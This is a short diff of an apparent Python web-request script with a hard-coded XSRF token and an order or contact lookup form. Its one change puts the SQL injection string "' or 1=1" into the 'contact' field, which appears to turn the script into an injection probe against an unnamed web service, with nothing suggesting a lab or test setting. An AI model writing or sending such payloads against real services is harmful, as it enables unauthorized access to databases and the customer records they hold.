@@ -25,7 +25,7 @@ headdic[
 headdic['X-Requested-With'] = 'XMLHttpRequest'
 headdic['X-XSRF-TOKEN'] = 'CbreHc2DB7PyWmXQmNQYFcYeWMSxHWRd'
 
-form = {'type': 'contact', 'contact': '123456', 'captcha': '', 'query_password': '', 'order_no': ''}
+form = {'type': 'contact', 'contact': '\' or 1=1', 'captcha': '', 'query_password': '', 'order_no': ''}
 # 忽略警告
 urllib3.disable_warnings()
 try:
